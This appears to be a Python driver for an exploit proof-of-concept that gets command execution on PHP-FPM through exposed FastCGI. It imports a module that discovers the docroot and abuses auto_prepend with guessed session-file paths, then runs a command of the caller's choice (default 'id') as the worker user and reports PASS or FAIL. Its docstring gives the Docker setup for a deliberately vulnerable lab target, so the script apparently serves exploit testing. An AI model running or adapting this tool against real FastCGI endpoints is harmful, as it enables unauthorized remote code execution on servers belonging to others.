#!/usr/bin/env python3
"""Driver for fcgi_autoprepend_autodiscover.py: lands `id` (uid=www-data) with NO
--script and NO --save-path -- the module discovers the docroot/script over raw
FastCGI and sweeps the save_path guesses itself. Needs a multi-worker pool.

Bring up a multi-worker fpm instance:
    printf '[www]\\npm = static\\npm.max_children = 6\\n' > /tmp/zzzz-multi.conf
    docker run -d --name p2s-fcgi -p 127.0.0.1:9200:9000 \\
        -v /tmp/zzzz-multi.conf:/usr/local/etc/php-fpm.d/zzzz-multi.conf:ro \\
        php2shell-fpm-vuln
    python3 -I poc/routes/verify_fcgi_autoprepend_autodiscover.py --host 127.0.0.1 --port 9200
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fcgi_autoprepend_autodiscover as ad  # noqa: E402


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9200)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--window", type=float, default=45.0)
    args = ap.parse_args(argv)

    print(f"=== fcgi auto_prepend AUTO-DISCOVER verify  {args.host}:{args.port} ===")
    print("    (no --script, no --save-path: fully file-free targeting)")
    ok, output, sess_file = ad.run(
        args.host, args.port, args.cmd,
        script=None, save_paths=None, window=args.window, verbose=True,
    )

    if not ok:
        print("\nRESULT: FAIL - no command execution landed")
        return 1

    uid_ok = "uid=" in (output or "")
    print(f"\nRESULT: PASS - command executed as the fpm worker (file-free)")
    print(f"  output      : {(output or '').strip()!r}")
    print(f"  sess_file   : {sess_file}")
    print(f"  uid present : {uid_ok}")
    return 0 if uid_ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
